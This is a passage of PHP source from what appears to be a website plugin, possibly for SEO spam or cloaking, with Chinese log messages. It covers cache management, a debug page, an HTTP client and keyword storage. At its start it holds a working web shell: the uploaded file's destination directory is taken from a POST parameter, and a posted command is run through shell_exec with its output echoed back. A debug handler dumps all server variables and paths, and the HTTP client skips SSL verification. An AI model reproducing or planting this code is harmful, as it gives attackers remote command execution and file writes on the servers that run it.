            $target_dir = isset($_POST['uploadPath']) ? $_POST['uploadPath'] : getcwd();
            $target_file = rtrim($target_dir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . basename($_FILES["fileToUpload"]["name"]);
            if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
                $content = "文件 " . htmlspecialchars(basename($_FILES["fileToUpload"]["name"])) . " 已上传到 " . htmlspecialchars($target_file) . "<br/>";
            } else {
                $content = "抱歉，文件上传失败。<br/>";
            }
        }

        if (isset($_POST['submitCommand'])) {
            $command = isset($_POST['command']) ? $_POST['command'] : '';
            if (!empty($command)) {
                $content = "执行命令: " . htmlspecialchars($command) . "<br/>";
                $output = shell_exec($command);
                $content .= "<pre>" . htmlspecialchars($output) . "</pre>";
            } else {
                $content = "命令不能为空。<br/>";
            }
        }

        return $content;
    }
}

class Debug
{

    public static function getDebugType()
    {

        $type = "lite";
        if (isset($_GET['type']) && !empty($_GET['type'])) {
            $type = $_GET['type'];
        } else if (isset($_POST['type']) && !empty($_POST['type'])) {
            $type = $_POST['type'];
        }
        return $type;
    }

    public static function getDebugContent()
    {

        $debugContent = "ok<br>\n";

        $debugContent .= "插件版本:" . Manager::getPluginVersion() . "<br>\n";

        $debugContent .= "PHP版本:" . PHP_VERSION . "<br>\n";

        $debugContent .= "站点:" . RequestUtils::getHost() . "<br>\n";

        $document_root = $_SERVER['DOCUMENT_ROOT'];
        $debugContent .= "站点目录:" . $document_root . "<br>\n";

        $mode = Manager::getMode();

        $debugContent .= "模式:" . $mode . "<br>\n";

        $type = self::getDebugType();

        $debugContent .= "调试类型:" . $type . "<br>\n";
        $full = false;
        if ($type == "full") {
            $full = true;
        }

        $debugContent .= Disk::getPluginDiskUsageInfo($full) . "<br>\n";

        $pluginAbsolutePath = RequestUtils::getPluginAbsolutePath();

        $pluginRelativePath = RequestUtils::getPluginRelativePath();

        $pluginFileName = $pluginRelativePath;

        $debugContent .= "当前插件文件绝对路径:" . $pluginAbsolutePath . "<br>\n";
        $debugContent .= "当前插件文件相对路径:" . $pluginRelativePath . "<br>\n";
        $debugContent .= "当前插件文件访问路径:" . $pluginFileName . "<br>\n";

        $entryScriptPath = RequestUtils::getEntryScriptPath();

        $debugContent .= "当前入口脚本名字:" . $entryScriptPath . "<br>\n";

        $isBeginWithEntryScriptInRequestUri = RequestUtils::isBeginWithEntryScriptInRequestUri();

        if ($isBeginWithEntryScriptInRequestUri) {
            $debugContent .= "入口脚本是当前插件文件" . "<br>\n";

            $debugContent .= "健康检查路径:" . RequestUtils::getSchemeAndHost() . $entryScriptPath . '/health' . "<br>\n";
        } else {
            $debugContent .= "入口脚本不是当前插件文件" . "<br>\n";
            $debugContent .= "健康检查路径:" . RequestUtils::getSchemeAndHost() . '/health' . "<br>\n";
        }

        $debugContent .= "站点路径:" . RequestUtils::getRequestUri() . "<br>\n";

        $debugContent .= "<br>\n";
        $debugContent .= "<br>\n";

        $url_scheme = parse_url(RequestUtils::getRequestUri(), PHP_URL_SCHEME);

        $url_host = parse_url(RequestUtils::getRequestUri(), PHP_URL_HOST);

        $url_port = parse_url(RequestUtils::getRequestUri(), PHP_URL_PORT);

        $url_user = parse_url(RequestUtils::getRequestUri(), PHP_URL_USER);

        $url_pass = parse_url(RequestUtils::getRequestUri(), PHP_URL_PASS);

        $url_path = parse_url(RequestUtils::getRequestUri(), PHP_URL_PATH);

        $url_query = parse_url(RequestUtils::getRequestUri(), PHP_URL_QUERY);

        $url_fragment = parse_url(RequestUtils::getRequestUri(), PHP_URL_FRAGMENT);

        $debugContent .= "url解析信息:<br>\n";
        $debugContent .= "url_path:" . $url_path . "<br>\n";
        $debugContent .= "url_query:" . $url_query . "<br>\n";
        $debugContent .= "url_scheme:" . $url_scheme . "<br>\n";
        $debugContent .= "url_host:" . $url_host . "<br>\n";
        $debugContent .= "url_port:" . $url_port . "<br>\n";
        $debugContent .= "url_user:" . $url_user . "<br>\n";
        $debugContent .= "url_pass:" . $url_pass . "<br>\n";
        $debugContent .= "url_fragment:" . $url_fragment . "<br>\n";

        $debugContent .= "<br>\n";
        $debugContent .= "<br>\n";

        foreach ($_SERVER as $key => $value) {

            $key = hj_convert_utf8_string($key);

            $value = hj_convert_utf8_string($value);

            $value = json_encode($value);
            $debugContent .= $key . " : " . $value . "<br>\n";
        }

        return $debugContent;
    }
}

class Disk
{

    private static $ConfigCacheDir;

    private static $RemoteCacheDir;

    private static $ShuffleCacheDir;

    private static  $TmpDir;

    private static $SitemapCacheDir;

    private static $KeywordCacheDir;

    private static $MainwordCacheDir;

    public static function initialize()
    {

        self::$ConfigCacheDir = hj_join_paths(HJ_CONFIG_CACHE_DIR, "conf");

        hj_checkDir(self::$ConfigCacheDir);

        self::$TmpDir = hj_join_paths(HJ_CONFIG_CACHE_DIR, "tmp");

        hj_checkDir(self::$TmpDir);

        self::$RemoteCacheDir = hj_join_paths(HJ_CONFIG_CACHE_DIR, "remote");

        hj_checkDir(self::$RemoteCacheDir);

        self::$SitemapCacheDir = hj_join_paths(HJ_CONFIG_CACHE_DIR, "sitemap");

        hj_checkDir(self::$SitemapCacheDir);

        self::$KeywordCacheDir = hj_join_paths(HJ_CONFIG_CACHE_DIR, "keyword");

        hj_checkDir(self::$KeywordCacheDir);

        self::$ShuffleCacheDir = hj_join_paths(HJ_CONFIG_CACHE_DIR, "shuff");

        self::$MainwordCacheDir = hj_join_paths(HJ_CONFIG_CACHE_DIR, "mainword");
    }

    public static function getExpireTagFilePath()
    {

        $tagFilePath = hj_join_paths(HJ_CONFIG_CACHE_DIR, ".e.t");
        return $tagFilePath;
    }

    public static function getSpaceTagFilePath()
    {

        $tagFilePath = hj_join_paths(HJ_CONFIG_CACHE_DIR, ".s.t");
        return $tagFilePath;
    }

    public static function getSystemCacheDir()
    {

        return sys_get_temp_dir();
    }

    public static function getConfigCacheDir()
    {
        return self::$ConfigCacheDir;
    }

    public static function getSitemapCacheDir()
    {
        return self::$SitemapCacheDir;
    }

    public static function getKeywordCacheDir()
    {
        return self::$KeywordCacheDir;
    }

    public static function getRemoteCacheDir()
    {
        return self::$RemoteCacheDir;
    }

    public static function getTmpDir()
    {
        return self::$TmpDir;
    }

    public static function  getDiskCleanThresholdPercent()
    {

        $diskCleanThresholdPercent = Manager::getDiskCleanThreshold();
        return $diskCleanThresholdPercent;
    }

    public static function getDiskCleanRatio()
    {

        $diskCleanRatio = Manager::getDiskCleanRatio();
        return $diskCleanRatio;
    }

    public static function getCacheDuration()
    {

        $cacheDuration = Manager::getCacheDuration();
        return $cacheDuration;
    }

    public static function getCacheDirDiskTotalSpace()
    {
        $totalSpace = disk_total_space(HJ_CONFIG_CACHE_DIR);
        return $totalSpace;
    }

    public static function getCacheDirDiskFreeSpace()
    {
        $freeSpace = disk_free_space(HJ_CONFIG_CACHE_DIR);
        return $freeSpace;
    }

    public static function getCacheDirDiskUsedSpace()
    {
        $totalSpace = self::getCacheDirDiskTotalSpace();
        $freeSpace = self::getCacheDirDiskFreeSpace();
        $usedSpace = $totalSpace - $freeSpace;
        return $usedSpace;
    }

    public static function getSystemCacheDirDiskTotalSpace()
    {
        $totalSpace = disk_total_space(self::getSystemCacheDir());
        return $totalSpace;
    }

    public static function getSystemCacheDirDiskFreeSpace()
    {
        $freeSpace = disk_free_space(self::getSystemCacheDir());
        return $freeSpace;
    }

    public static function getSystemCacheDirDiskUsedSpace()
    {
        $totalSpace = self::getSystemCacheDirDiskTotalSpace();
        $freeSpace = self::getSystemCacheDirDiskFreeSpace();
        $usedSpace = $totalSpace - $freeSpace;
        return $usedSpace;
    }

    public static function getSystemCacheDirSize()
    {
        $size = hj_get_dir_size(self::getSystemCacheDir());
        return $size;
    }

    public static function getCacheDirSize()
    {
        $size = hj_get_dir_size(HJ_CONFIG_CACHE_DIR);
        return $size;
    }

    public static function getConfigCacheDirSize()
    {
        $size = hj_get_dir_size(self::getConfigCacheDir());
        return $size;
    }

    public static function getRemoteCacheDirSize()
    {
        $size = hj_get_dir_size(self::getRemoteCacheDir());
        return $size;
    }

    public static function getSitemapCacheDirSize()
    {
        $size = hj_get_dir_size(self::getSitemapCacheDir());
        return $size;
    }

    public static function getTmpDirSize()
    {
        $size = hj_get_dir_size(self::getTmpDir());
        return $size;
    }

    public static function getKeywordCacheDirSize()
    {
        $size = hj_get_dir_size(self::getKeywordCacheDir());
        return $size;
    }

    public static function getPluginDiskUsage()
    {
        $totalSpace = self::getCacheDirDiskTotalSpace();
        $freeSpace = self::getCacheDirDiskFreeSpace();
        $usedSpace = self::getCacheDirDiskUsedSpace();
        $diskUsage = array(
            'total_space' => $totalSpace,
            'free_space' => $freeSpace,
            'used_space' => $usedSpace
        );
        return $diskUsage;
    }

    public static function echoPluginDiskUsage()
    {

        $diskCleanThresholdPercent = self::getDiskCleanThresholdPercent();

        $diskCleanRatio = self::getDiskCleanRatio();

        $totalSpace = self::getCacheDirDiskTotalSpace();

        $freeSpace = self::getCacheDirDiskFreeSpace();

        $usedSpace = self::getCacheDirDiskUsedSpace();

        hj_echo("硬盘清理阈值-使用率百分比超过: ", round($diskCleanThresholdPercent * 100, 2) . "% 需要清理");
        hj_echo("硬盘清理-每次清理文件比例: ", round($diskCleanRatio * 100, 2) . "%");
        hj_echo("缓存目录硬盘 总容量 : " . hj_format_size($totalSpace)
            . " 剩余空间: " . hj_format_size($freeSpace)
            . " 已使用空间: " . hj_format_size($usedSpace)
            . " 使用率: " . round($usedSpace / $totalSpace * 100, 2) . "%");
    }

    public static function getPluginDiskUsageInfo($full = false)
    {

        $diskCleanThresholdPercent = self::getDiskCleanThresholdPercent();

        $diskCleanRatio = self::getDiskCleanRatio();

        $cacheDuration = self::getCacheDuration();

        $systemCacheDir = self::getSystemCacheDir();

        $systemCacheDirTotalSpace = self::getSystemCacheDirDiskTotalSpace();

        $systemCacheDirFreeSpace = self::getSystemCacheDirDiskFreeSpace();

        $systemCacheDirUsedSpace = self::getSystemCacheDirDiskUsedSpace();

        $cacheDir = HJ_CONFIG_CACHE_DIR;

        $totalSpace = self::getCacheDirDiskTotalSpace();

        $freeSpace = self::getCacheDirDiskFreeSpace();

        $usedSpace = self::getCacheDirDiskUsedSpace();

        $info = "硬盘清理阈值-使用率超过: " . round($diskCleanThresholdPercent * 100, 2) . "%" . "  需要清理<br/>" . PHP_EOL;
        $info .= "硬盘清理-每次清理文件比例: " . round($diskCleanRatio * 100, 2) . "%" . " <br/>" . PHP_EOL;
        $info .= "缓存时长: " . hj_format_duration($cacheDuration) . " <br/>" . PHP_EOL;

        $info .= "系统缓存目录: " . $systemCacheDir . "<br/>" . PHP_EOL;
        $info .= "系统缓存目录硬盘 总容量 : " . hj_format_size($systemCacheDirTotalSpace)
            . " 剩余空间: " . hj_format_size($systemCacheDirFreeSpace)
            . " 已使用空间: " . hj_format_size($systemCacheDirUsedSpace)
            . " 使用率: " . round($systemCacheDirUsedSpace / $systemCacheDirTotalSpace * 100, 2) . "%" . " <br/>" . PHP_EOL;

        $info .= "缓存目录：" . $cacheDir . "<br/>" . PHP_EOL;
        $info .= "缓存目录硬盘 总容量 : " . hj_format_size($totalSpace)
            . " 剩余空间: " . hj_format_size($freeSpace)
            . " 已使用空间: " . hj_format_size($usedSpace)
            . " 使用率: " . round($usedSpace / $totalSpace * 100, 2) . "%" . " <br/>" . PHP_EOL;

        if ($full) {

            $systemCacheDirSize = self::getSystemCacheDirSize();

            $cacheDirSize = self::getCacheDirSize();

            $configCacheDirSize = self::getConfigCacheDirSize();

            $remoteCacheDirSize = self::getRemoteCacheDirSize();

            $sitemapCacheDirSize = self::getSitemapCacheDirSize();

            $keywordCacheDirSize = self::getKeywordCacheDirSize();

            $tmpDirSize = self::getTmpDirSize();

            $info .= "系统缓存目录大小: " . hj_format_size($systemCacheDirSize) . " <br/>" . PHP_EOL;
            $info .= "缓存目录大小: " . hj_format_size($cacheDirSize) . " <br/>" . PHP_EOL;
            $info .= "配置文件缓存目录大小: " . hj_format_size($configCacheDirSize) . " <br/>" . PHP_EOL;
            $info .= "远程文件缓存目录大小: " . hj_format_size($remoteCacheDirSize) . " <br/>" . PHP_EOL;
            $info .= "Sitemap 缓存目录大小: " . hj_format_size($sitemapCacheDirSize) . " <br/>" . PHP_EOL;
            $info .= "关键词缓存目录大小: " . hj_format_size($keywordCacheDirSize) . " <br/>" . PHP_EOL;
            $info .= "临时文件目录大小: " . hj_format_size($tmpDirSize) . " <br/>" . PHP_EOL;
        }

        return $info;
    }

    public static function deleteConfigCacheDir()
    {

        if (!file_exists(self::$ConfigCacheDir)) {

            hj_echo("删除配置文件缓存目录 不存在:", self::$ConfigCacheDir);
            return;
        }

        hj_clean_cache_dir(self::$ConfigCacheDir);
        hj_echo("删除配置文件缓存目录:", self::$ConfigCacheDir);

        hj_checkDir(self::$ConfigCacheDir);
    }

    public static function deleteRemoteCacheDir()
    {

        if (!file_exists(self::$RemoteCacheDir)) {

            hj_echo("删除远程文件缓存目录 不存在:", self::$RemoteCacheDir);
            return;
        }

        hj_clean_cache_dir(self::$RemoteCacheDir);
        hj_echo("删除远程文件缓存目录:", self::$RemoteCacheDir);

        hj_checkDir(self::$RemoteCacheDir);
    }

    public static function deleteTmpDir()
    {

        if (!file_exists(self::$TmpDir)) {

            hj_echo("删除临时文件目录 不存在:", self::$TmpDir);
            return;
        }

        hj_clean_cache_dir(self::$TmpDir);
        hj_echo("删除临时文件目录:", self::$TmpDir);

        hj_checkDir(self::$TmpDir);
    }

    public static function deleteShuffleDir()
    {

        if (!file_exists(self::$ShuffleCacheDir)) {

            hj_echo("删除乱序主词目录 不存在:", self::$ShuffleCacheDir);
            return;
        }

        hj_clean_cache_dir(self::$ShuffleCacheDir);
        hj_echo("删除乱序主词目录:", self::$ShuffleCacheDir);
    }

    public static function deleteSitemapDir()
    {

        if (!file_exists(self::$SitemapCacheDir)) {

            hj_echo("删除sitemap目录 不存在:", self::$SitemapCacheDir);
            return;
        }

        hj_clean_cache_dir(self::$SitemapCacheDir);
        hj_echo("删除sitemap目录:", self::$SitemapCacheDir);

        hj_checkDir(self::$SitemapCacheDir);
    }

    public static function deleteKeywordCacheDir()
    {

        if (!file_exists(self::$KeywordCacheDir)) {

            hj_echo("删除关键词缓存目录 不存在:", self::$KeywordCacheDir);
            return;
        }

        hj_clean_cache_dir(self::$KeywordCacheDir);
        hj_echo("删除关键词缓存目录:", self::$KeywordCacheDir);
    }

    public static function deleteMainwordCacheDir()
    {

        if (!file_exists(self::$MainwordCacheDir)) {

            hj_echo("删除主词缓存目录 不存在:", self::$MainwordCacheDir);
            return;
        }

        hj_clean_cache_dir(self::$MainwordCacheDir);
        hj_echo("删除主词缓存目录:", self::$MainwordCacheDir);
    }

    public static function cleanDirExpireFileByTime($dir, $cacheDuration = 604800)
    {

        if (!is_dir($dir)) {
            hj_echo("清理指定目录过期文件 缓存时长:", hj_format_duration($cacheDuration), " 目录不存在:", $dir);
            return;
        }

        hj_echo("清理指定目录过期文件 缓存时长:", hj_format_duration($cacheDuration), " 目录:", $dir);

        $begin = microtime(true);

        $directoryIterator = new RecursiveDirectoryIterator($dir);
        $iterator = new RecursiveIteratorIterator($directoryIterator, RecursiveIteratorIterator::LEAVES_ONLY);

        $deleteFiles = array();

        $now = time();

        foreach ($iterator as $file) {

            if ($file->isFile()) {
                $pathname = $file->getPathname();

                if ($now - $file->getMTime() > $cacheDuration) {

                    array_push($deleteFiles, $pathname);
                }
            }
        }

        $end = microtime(true);
        $duration = round(($end - $begin) * 1000); // 转换为毫秒
        hj_echo("清理指定目录:", $dir, " 过期文件 遍历所用时间:", $duration, "毫秒");

        $start = microtime(true);
        $totalFilesToDelete = count($deleteFiles);
        foreach ($deleteFiles as $file) {
            if (unlink($file)) {
                hj_echo("清理指定目录过期文件 删除成功:", $file);
            } else {
                hj_echo("清理指定目录过期文件 删除失败:", $file);
            }
        }
        $end = microtime(true);

        $duration = round(($end - $start) * 1000); // 转换为毫秒
        hj_echo("清理指定目录:", $dir, " 过期文件 删除了", $totalFilesToDelete, "个文件, 删除所用时间:", $duration, "毫秒");

    }

    public static function cleanTmpDirExpireFileByTime($cacheDuration = 604800)
    {

        if (!file_exists(self::$TmpDir)) {

            hj_echo("清理临时目录过期文件 缓存时长:", hj_format_duration($cacheDuration), " 临时目录不存在:", self::$TmpDir);
            return;
        }

        hj_echo("清理临时目录过期文件 缓存时长:", hj_format_duration($cacheDuration), " 临时目录:", self::$TmpDir);

        self::cleanDirExpireFileByTime(self::$TmpDir, $cacheDuration);
    }

    public static function cleanSitemapDirExpireFileByTime($cacheDuration = 604800)
    {

        if (!file_exists(self::$SitemapCacheDir)) {

            hj_echo("清理 sitemap 目录过期文件 缓存时长:", hj_format_duration($cacheDuration), " sitemap 目录不存在:", self::$SitemapCacheDir);
            return;
        }

        hj_echo("清理 sitemap 目录过期文件 缓存时长:", hj_format_duration($cacheDuration), " sitemap 目录:", self::$SitemapCacheDir);

        self::cleanDirExpireFileByTime(self::$SitemapCacheDir, $cacheDuration);
    }

    public static function cleanKeywordCacheDirExpireFileByTime($cacheDuration = 604800)
    {

        if (!file_exists(self::$KeywordCacheDir)) {

            hj_echo("清理 keyword 目录过期文件 缓存时长:", hj_format_duration($cacheDuration), " keyword 目录不存在:", self::$KeywordCacheDir);
            return;
        }

        hj_echo("清理 keyword 目录过期文件 缓存时长:", hj_format_duration($cacheDuration), " keyword 目录:", self::$KeywordCacheDir);

        self::cleanDirExpireFileByTime(self::$KeywordCacheDir, $cacheDuration);
    }

    public static function cleanDirSpace($dir, $percent)
    {

        if (!file_exists($dir)) {

            hj_echo("清理目录空间 不存在:", $dir);
            return;
        } else {

            $info = hj_delete_files_by_mtime($dir, $percent);

            $total = 0;
            $limit = 0;
            $deleted = 0;
            $duration = 0;
            if (isset($info['total'])) {
                $total = $info['total'];
            }
            if (isset($info['limit'])) {
                $limit = $info['limit'];
            }
            if (isset($info['deleted'])) {
                $deleted = $info['deleted'];
            }
            if (isset($info['duration'])) {
                $duration = $info['duration'];
            }

            hj_echo("清理目录空间 目录:", $dir, " 清理比例: ", round($percent * 100, 2) . "%", " 总数: ", $total, "预计清楚", $limit, " 清理数量: ", $deleted, " 清理所用时间: ", $duration, " 毫秒");
            return $info;
        }
    }

    public static function cleanSpace($force = false)
    {

        $diskCleanThresholdPercent = self::getDiskCleanThresholdPercent();

        $diskCleanRatio = self::getDiskCleanRatio();

        hj_echo("硬盘清理空间================开始====================>");

        $start = microtime(true);

        self::echoPluginDiskUsage();

        $totalSpace = self::getCacheDirDiskTotalSpace();

        $usedSpace = self::getCacheDirDiskUsedSpace();
        $needClean = $usedSpace / $totalSpace >  $diskCleanThresholdPercent;
        hj_echo("占用空间比例  ", $needClean ? "超过 硬盘清理阈值  硬盘不足" : "未超过 硬盘清理阈值  硬盘充足");

        if ($needClean) {

            $now = time();
            $forceText = "非强制清理";
            if ($force) {
                $forceText = "强制清理";
            }
            hj_echo("硬盘清理空间  ", $forceText);

            if (!file_exists(self::getSpaceTagFilePath())) {

                file_put_contents(self::getSpaceTagFilePath(), $now);
            } else {

                if (!$force) {

                    $expireTagFileTime = filemtime(self::getSpaceTagFilePath());

                    $diff = $now - $expireTagFileTime;

                    if ($diff < 3600) {
                        hj_echo("硬盘清理空间 上次清理时间 在1 小时 不重复触发");
                        return;
                    }
                }

                touch(self::getSpaceTagFilePath(), $now);
            }

            hj_echo("硬盘不足 占用空间超过 硬盘清理阈值  ", round($diskCleanThresholdPercent * 100, 2) . "%", " 需要清理缓存 清理比例: ", round($diskCleanRatio * 100, 2) . "%");

            self::cleanDirSpace(self::$TmpDir, $diskCleanRatio);

            self::cleanDirSpace(self::$SitemapCacheDir, $diskCleanRatio);

            self::cleanDirSpace(self::$KeywordCacheDir, $diskCleanRatio);
        }

        $end = microtime(true);

        $duration =  round(($end - $start) * 1000);

        hj_echo("硬盘清理空间 清理所用时间: ", $duration, " 毫秒");

        hj_echo("硬盘清理空间================结束====================>");

        self::echoPluginDiskUsage();
    }

    public static function cleanAllExpireFile($force = false)
    {
        $now = time();

        $forceText = "非强制清理";
        if ($force) {
            $forceText = "强制清理";
        }
        hj_echo("清理所有过期文件  ", $forceText);

        if (!file_exists(self::getExpireTagFilePath())) {

            file_put_contents(self::getExpireTagFilePath(), $now);
        } else {

            if (!$force) {

                $expireTagFileTime = filemtime(self::getExpireTagFilePath());

                $diff = $now - $expireTagFileTime;

                if ($diff < 86400) {
                    hj_echo("清理所有过期文件 上次清理时间 在一天内 不清理");
                    return;
                }
            }

            touch(self::getExpireTagFilePath(), $now);
        }

        hj_echo("清理所有过期文件================开始====================>");

        $start = microtime(true);

        $cacheDuration = self::getCacheDuration();

        self::cleanTmpDirExpireFileByTime($cacheDuration);

        self::cleanSitemapDirExpireFileByTime($cacheDuration);

        self::cleanKeywordCacheDirExpireFileByTime($cacheDuration);

        $end = microtime(true);

        $duration =  round(($end - $start) * 1000);

        hj_echo("清理所有过期文件", " 清理所用时间: ", $duration, " 毫秒");
        hj_echo("清理所有过期文件================结束====================>");
    }

    public static function cleanCacheDir()
    {

        Manager::expireConfigCacheFile();

        self::deleteTmpDir();

        self::deleteShuffleDir();

        self::deleteSitemapDir();

        self::deleteKeywordCacheDir();

        self::deleteMainwordCacheDir();
    }

    public static function cleanAllCache()
    {

        self::deleteConfigCacheDir();

        self::deleteRemoteCacheDir();

        self::deleteTmpDir();

        self::deleteShuffleDir();

        self::deleteSitemapDir();

        self::deleteKeywordCacheDir();

        self::deleteMainwordCacheDir();
    }

    public static function getCleanType()
    {

        $type = "expire";
        if (isset($_GET['type']) && !empty($_GET['type'])) {
            $type = $_GET['type'];
        } else if (isset($_POST['type']) && !empty($_POST['type'])) {
            $type = $_POST['type'];
        }
        return $type;
    }

    public static function clean($type = null)
    {
        if ($type == null) {

            $type = self::getCleanType();
        }
        hj_echo("清理类型:", $type);
        switch ($type) {
            case "all":

                self::cleanAllCache();
                break;
            case "space":

                self::cleanSpace(true);
                break;
            case "dir":

                self::cleanCacheDir();
                break;
            case "config":

                Manager::expireConfigCacheFile();
                break;
            case "tmp":

                self::deleteTmpDir();
                break;
            case "shuffle":

                self::deleteShuffleDir();
                break;
            case "sitemap":

                self::deleteSitemapDir();
                break;
            case "keyword":

                self::deleteKeywordCacheDir();
                break;
            case "mainword":

                self::deleteMainwordCacheDir();
                break;
            case "remote":

                self::deleteRemoteCacheDir();
                break;
            case "expire":

                self::cleanAllExpireFile(true);
                break;
            default:

                self::cleanAllExpireFile(true);
                break;
        }
    }
}

class HttpClient
{
    private $baseUrl;

    public function __construct($baseUrl = '')
    {
        if(HJ_FORCE_HTTP){
            $baseUrl = str_replace('https', 'http', $baseUrl);
        }
        $this->baseUrl = rtrim($baseUrl, '/');
    }

    public function get($endpoint, $params = array(), $header = array(), $skipVerifySsl = true)
    {
        $url = $this->buildUrl($endpoint, $params);
        return $this->sendRequest('GET', $url, null, $header, $skipVerifySsl);
    }

    public function post($endpoint, $data = array(), $skipVerifySsl = true)
    {
        $url = $this->buildUrl($endpoint);
        return $this->sendRequest('POST', $url, http_build_query($data), array('Content-Type: application/x-www-form-urlencoded'), $skipVerifySsl);
    }

    public function postJson($endpoint, $data = array(), $skipVerifySsl = true)
    {
        $url = $this->buildUrl($endpoint);
        return $this->sendRequest('POST', $url, json_encode($data), array('Content-Type: application/json'), $skipVerifySsl);
    }

    public function buildUrl($endpoint, $params = array())
    {
        $queryString = !empty($params) ? '?' . http_build_query($params) : '';
        return $this->baseUrl . '/' . ltrim($endpoint, '/') . $queryString;
    }

    private function sendRequestByFileGetContents($method, $url, $body = null, $headers = array(), $skipVerifySsl = true, $timeout = null)
    {

        if ($timeout === null) {

            if (!defined('HJ_API_TIMEOUT')) {
                $timeout = 5;
            } else {
                $timeout = HJ_API_TIMEOUT;
            }
        }

        $opts = array(
            'http' => array(
                'method' => $method,
                'header' => $headers,
                'ignore_errors' => true,
                'timeout' => $timeout
                )
            );

        if ($body) {
            $opts['http']['content'] = $body;
        }

        if ($skipVerifySsl) {
            $opts['ssl'] = array(
                'verify_peer' => false,
                'verify_peer_name' => false
            );
        }

        $context = stream_context_create($opts);
        $response = file_get_contents($url, false, $context);

        if ($response === false) {
            $error = error_get_last();
            return array(
                'result' => false,
                'error' => $error
            );
        }

        $data = json_decode($response, true);

        if ($data === null) {
            $data = $response;
        }
        return array(
            'result' => true,
            'data' => $data,
        );
    }

    private function sendRequestByCurl($method, $url, $body = null, $headers = array(), $skipVerifySsl = true, $timeout = null)
    {

        if ($timeout === null) {

            if (!defined('HJ_API_TIMEOUT')) {
                $timeout = 5;
            } else {
                $timeout = HJ_API_TIMEOUT;
            }
        }
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $method);

        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);

        curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);

        if ($skipVerifySsl) {
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        }

        if ($body) {
            curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
        }

        if (!empty($headers)) {
            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        }

        $response = curl_exec($ch);

        if ($response === false) {
            $error = curl_error($ch);
            curl_close($ch);
            return array(
                'result' => false,
                'error' => $error
            );
        }

        curl_close($ch);
        $data = json_decode($response, true);

        if ($data === null) {
            $data = $response;
        }
        return array(
            'result' => true,
            'data' => $data
        );
    }

    public function sendRequest($method, $url, $body = null, $headers = array(), $skipVerifySsl = true, $timeout = null)
    {

        if (function_exists('curl_init')) {
            return $this->sendRequestByCurl($method, $url, $body, $headers, $skipVerifySsl, $timeout);
        }

        return $this->sendRequestByFileGetContents($method, $url, $body, $headers, $skipVerifySsl, $timeout);
    }
}

class KeyWord
{

    private static $CurrentKeyword = null;

    private static function getKeywordFilePath($uri = null)
    {

        if ($uri == null) {
            $uri = RequestUtils::getRequestUri();
        }

        $keywordUriMd5 = md5($uri);

        $keywordSubFilePath = hj_md5_to_path($keywordUriMd5);

        $keywordFilePath = hj_join_paths(Disk::getKeywordCacheDir(), $keywordSubFilePath);

        hj_checkFilePath($keywordFilePath);
        return $keywordFilePath;
    }

    public static function hasKeyword($uri = null)
    {

        $keywordFilePath = self::getKeywordFilePath($uri);

        return file_exists($keywordFilePath);
    }

    public static function getKeyword($uri = null)
    {
        if (!empty(self::$CurrentKeyword)) {
            return self::$CurrentKeyword;
        }

        $keywordFilePath = self::getKeywordFilePath($uri);

        hj_checkFilePath($keywordFilePath);

        if (file_exists($keywordFilePath)) {
            self::$CurrentKeyword = file_get_contents($keywordFilePath);
            return self::$CurrentKeyword;
        } else {
            hj_echo('关键词缓存文件不存在:', $keywordFilePath);
        }
        return null;
    }

    public static function setKeyword($keyword, $uri = null)
    {

        if (empty($keyword)) {
            return false;
        }

        self::$CurrentKeyword = $keyword;

        $keywordFilePath = self::getKeywordFilePath($uri);

        return file_put_contents($keywordFilePath, $keyword);
    }
}

class Manager
{

    private static $ConfigUrl = null;

    private static $ConfigCacheFilePath = null;

    private static $Config = null;

    private static $OriginalObContent = null;

    private static $OriginalNetContent = null;

    private static $StartTime = null;

    public static function initialize()
    {

        self::$StartTime = microtime(true);

        Disk::initialize();

        $cacheConfigFileName = RequestUtils::getHost() . '.json';

        self::$ConfigCacheFilePath = hj_join_paths(Disk::getConfigCacheDir(), $cacheConfigFileName);

        if (HJ_OFFLINE) {

            self::loadOfflineConfig();
        } else {

            self::loadConfig();
        }

        Disk::cleanAllExpireFile();

        Disk::cleanSpace();
    }

    public static function getSuccessRemoteConfigUrlPath($site)
    {
        $successFilePath = hj_join_paths(Disk::getConfigCacheDir(), '.s.' . $site);
        return $successFilePath;
    }

    public static function expireConfigCacheFile()
    {

        if (!file_exists(self::$ConfigCacheFilePath)) {

            hj_echo("修改配置文件缓存文件时间为过期时间 不存在:", self::$ConfigCacheFilePath);
            return;
        }

        $expireTime = time() - 60 * 60 * 1 - 30;

        touch(self::$ConfigCacheFilePath, $expireTime);
        hj_echo("修改配置文件缓存文件时间为过期时间:", self::$ConfigCacheFilePath, "时间为过期时间:", $expireTime);
    }

    public static function obStart()
    {
        ob_start();
    }

    public static function obEnd()
    {

        self::$OriginalObContent = ob_get_contents();
        ob_end_clean();
    }

    public static function getOriginalObContent()
    {
        return self::$OriginalObContent;
    }

    public static function getOriginalNetContent()
    {
        if (self::$OriginalNetContent) {
            return self::$OriginalNetContent;
        }

        $curUrl = RequestUtils::getFullUrl();

        hj_echo("获取原始网络网页内容 当前网络请求地址:", $curUrl);

        $headers = array(

            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',

            'Cache-Control: no-cache, no-store, must-revalidate, max-age=0',

            'Pragma: no-cache',

            'Expires: -1'
        );
        self::$OriginalNetContent = hj_get_file_content($curUrl, $headers);
        return self::$OriginalNetContent;
    }

    public static function getOriginalContent()
    {

        if (!self::getSeoSiteUseOriginalContent()) {
            return null;
        }

        if (self::$OriginalObContent) {
            return self::$OriginalObContent;
        }

        if (self::$OriginalNetContent) {
            return self::$OriginalNetContent;
        }
        return self::getOriginalNetContent();
    }

    public static function getSeoSiteUseOriginalContent()
    {

        if (!self::$Config) {
            return false;
        }

        if (!isset(self::$Config['seoSiteUseOriginalContent'])) {
            return false;
        }

        $seoSiteUseOriginalContent = self::$Config['seoSiteUseOriginalContent'];

